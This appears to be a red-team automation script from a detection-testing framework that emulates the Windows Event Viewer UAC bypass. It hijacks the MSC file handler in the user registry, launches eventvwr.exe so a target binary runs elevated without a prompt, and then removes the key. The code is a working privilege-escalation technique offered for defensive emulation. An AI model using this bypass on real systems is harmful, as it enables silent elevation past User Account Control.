"""
Name: Bypass UAC via Event Viewer
RTA: uac_eventviewer.py
ATT&CK: T1088
Description:
The uac_eventviewer.py script modifies the registry value to change the handler for MSC files, effectively bypassing User Account Control (UAC).
Key Features:
- UAC Bypass: Alters the registry to redirect MSC file execution, allowing for elevation without a prompt.
- Event Viewer Execution: Launches the Event Viewer to facilitate the bypass.
- Windows-Specific: This script modifies the Windows registry and should only run on Windows systems.
"""

import winreg as winreg
import platform
import common


def main(target_file=common.get_path("bin", "myapp.exe")):
    # Ensure script only runs on Windows
    if platform.system() != 'Windows':
        common.log("This script only runs on Windows.")
        return common.UNSUPPORTED_RTA

    common.log("Bypass UAC with %s" % target_file)

    common.log("Writing registry key")
    hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
    winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)

    common.log("Running Event Viewer")
    common.execute(["c:\\windows\\system32\\eventvwr.exe"])

    common.log("Restoring registry key", log_type="-")
    winreg.DeleteValue(hkey, "")
    winreg.DeleteKey(hkey, "")
    winreg.CloseKey(hkey)


if __name__ == "__main__":
    exit(main())
